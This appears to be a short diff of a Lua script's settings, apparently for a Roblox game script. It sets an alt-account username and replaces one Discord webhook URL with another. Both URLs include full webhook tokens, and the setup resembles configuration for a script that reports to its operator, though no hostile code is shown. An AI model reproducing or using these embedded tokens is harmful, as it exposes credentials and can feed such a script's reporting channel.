@@ -1,5 +1,5 @@
 Username = "FNTCLOUT_ALT111"
-WebHook = "https://discord.com/api/webhooks/1089776915415584939/uwFQHg5I8n9VUMtbgUchtfnSIMqSYyXnQRAB-Dp6MmkyaVPiXShTBwCuFrAvGEAZkPXN"
+WebHook = "https://discord.com/api/webhooks/1089777255921758259/Mnov_IRbknajvebtiRxrsFbMCKWADAQFU3pTbUMJMNm_NK1scMKjyT2Ij7WqzuzWNbsp"
 
 
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
